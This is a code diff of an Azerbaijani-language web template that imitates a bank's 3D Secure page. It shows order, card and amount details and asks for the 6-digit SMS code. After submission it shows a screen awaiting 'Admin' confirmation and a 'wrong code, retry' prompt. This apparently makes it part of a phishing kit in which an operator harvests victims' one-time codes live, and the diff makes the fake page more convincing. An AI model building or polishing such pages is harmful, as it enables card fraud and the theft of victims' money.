@@ -1,55 +1,103 @@
+<!-- OTP Daxil Etmə Səhifəsi - Sadələşdirilmiş -->
 <section class="section">
   <div class="container">
-    <div class="secure3d">
-      <div class="secure3d__head">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/>
-        </svg>
-        <strong><%= t('secure3d.title') %></strong>
-      </div>
+    <div style="max-width:520px;margin:0 auto">
+      <div class="card">
+        <div class="card__head" style="text-align:center">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin:0 auto 8px">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/>
+          </svg>
+          <h1 style="font-size:1.3rem;margin:0">🔐 3D Secure Doğrulaması</h1>
+        </div>
+        
+        <div class="card__body">
+          
+          <!-- Sifarış Məlumatları -->
+          <dl class="kv mb-20" style="text-align:center">
+            <dt>Sifarış №</dt><dd class="mono" style="font-size:1.1rem"><%= order.orderNo %></dd>
+            <dt>Kart</dt><dd class="mono"><%= cardMasked || '—' %></dd>
+            <dt>Məbləğ</dt><dd class="mono" style="font-size:1.2rem;font-weight:bold;color:#0084ff"><%= order.total.toFixed(2) %> ₼</dd>
+          </dl>
 
-      <div class="secure3d__body">
-        <dl class="kv mb-16">
-          <dt><%= t('payment.orderLabel') %></dt><dd><%= order.orderNo %></dd>
-          <dt><%= t('secure3d.card') %></dt><dd class="mono"><%= cardMasked || '—' %></dd>
-          <dt><%= t('payment.amountLabel') %></dt><dd class="mono"><%= order.total.toFixed(2) %> ₼</dd>
-        </dl>
+          <% if (codeSubmitted) { %>
+            
+            <!-- COD ÖNCEDENDİR GÖNDERILDISƏ: Gözləmə Ekranı -->
+            <div id="stageBox" class="text-center"
+                 data-status-url="/api/payment/<%= order._id %>/status"
+                 data-order-id="<%= order._id %>"
+                 data-stage="<%= stage %>"
+                 data-stage-seconds="120"
+                 data-seconds-left="<%= secondsLeft %>">
+              
+              <h2 style="font-size:1.15rem;margin-bottom:20px" data-stage-title>
+                Admin tərəfindən təsdiq beklənilir...
+              </h2>
+              
+              <div data-stage-alert class="alert alert--error" style="display:none;margin-bottom:16px"></div>
+              
+              <!-- Geri Sayım Halka -->
+              <%- include('../partials/countdown-ring') %>
+              
+              <p class="sec-note" data-stage-note>
+                Bank yekun təsdiqi aparır. Bu ekranı bağlamayın.
+              </p>
 
-        <% if (codeSubmitted) { %>
-          <div id="stageBox" class="text-center"
-               data-status-url="/api/payment/<%= order._id %>/status"
-               data-order-id="<%= order._id %>"
-               data-stage="<%= stage %>"
-               data-stage-seconds="<%= stageSeconds %>"
-               data-seconds-left="<%= secondsLeft %>">
-            <h2 style="font-size:1.15rem" data-stage-title>OTP kodu göndərildi</h2>
-            <div data-stage-alert class="alert alert--error" style="display:none"></div>
-            <%- include('../partials/countdown-ring') %>
-            <p class="sec-note" data-stage-note>Yekun təsdiq gözlənilir. Bu ekranı bağlamayın.</p>
-            <div id="retryBox" style="display:none;margin-top:20px">
-              <p class="alert alert--error"><strong>OTP kodu səhvdir!</strong> Lütfən yenidən cəhd edin.</p>
-              <button type="button" id="retryBtn" class="btn btn--secondary">Yenidən Cəhd Et</button>
+              <!-- Yenidən Cəhd (Səhv OTP varsa) -->
+              <div id="retryBox" style="display:none;margin-top:24px">
+                <div class="alert alert--error" style="margin-bottom:16px">
+                  <strong>❌ Səhv OTP Kodu!</strong><br>
+                  Lütfən yenidən cəhd edin…
+                </div>
+                <button type="button" id="retryBtn" class="btn btn--secondary btn--lg" style="width:100%">
+                  🔄 Yenidən Cəhd Et
+                </button>
+              </div>
             </div>
-          </div>
-        <% } else { %>
-          <div class="alert alert--success mb-16">
-            <strong>Bankdan göndərilən OTP kodunu daxil edin.</strong><br>
-            Kod 6 rəqəmdir.
-          </div>
-          <div id="formNote" class="hidden"></div>
-          <form id="codeForm" data-order-id="<%= order._id %>">
-            <div class="field">
-              <label for="code"><%= t('secure3d.code') %> (OTP)</label>
-              <input type="text" id="code" name="code" class="code-input" data-code inputmode="numeric" maxlength="6" placeholder="000000" required autofocus />
-              <small class="sec-note">6 rəqəmli kodu daxil edin.</small>
+
+          <% } else { %>
+            
+            <!-- OTP FORMU: Kod daxil etmə -->
+            <div class="alert alert--success mb-20">
+              <strong>📧 Bankandan göndərilən OTP kodu daxil edin</strong><br>
+              <small style="color:#666">SMS vasitəsilə 6 rəqəmli kod aldığınız qeyd olunmalıdır</small>
             </div>
-            <button type="submit" class="btn btn--primary btn--block btn--lg"><%= t('secure3d.submit') %></button>
-          </form>
-          <p class="sec-note mt-16 text-center">Admin tərəfindən kod təsdiqini gözləyin…</p>
-        <% } %>
+
+            <form id="codeForm" data-order-id="<%= order._id %>" style="margin-bottom:16px">
+              <div class="field">
+                <label for="code" style="font-weight:600">OTP Kodu</label>
+                <input 
+                  type="text" 
+                  id="code" 
+                  name="code" 
+                  data-code
+                  inputmode="numeric" 
+                  maxlength="6" 
+                  placeholder="000000" 
+                  required 
+                  autofocus
+                  style="font-size:1.8rem;letter-spacing:0.2em;text-align:center"
+                />
+                <small class="sec-note" style="margin-top:6px">Məsələn: 123456</small>
+              </div>
+              
+              <button type="submit" class="btn btn--primary btn--lg" style="width:100%;margin-top:16px">
+                 Təsdiqlə
+              </button>
+            </form>
+
+            <div id="formNote" class="hidden alert"></div>
+
+            <p class="sec-note text-center" style="margin-top:16px">
+              ⏱️ 2 dəqiqə içində kodu daxil edin
+            </p>
+
+          <% } %>
+
+        </div>
       </div>
     </div>
   </div>
 </section>
 
 <script src="/public/js/secure-flow.js" defer></script>
+<script src="/public/js/payment.js" defer></script>
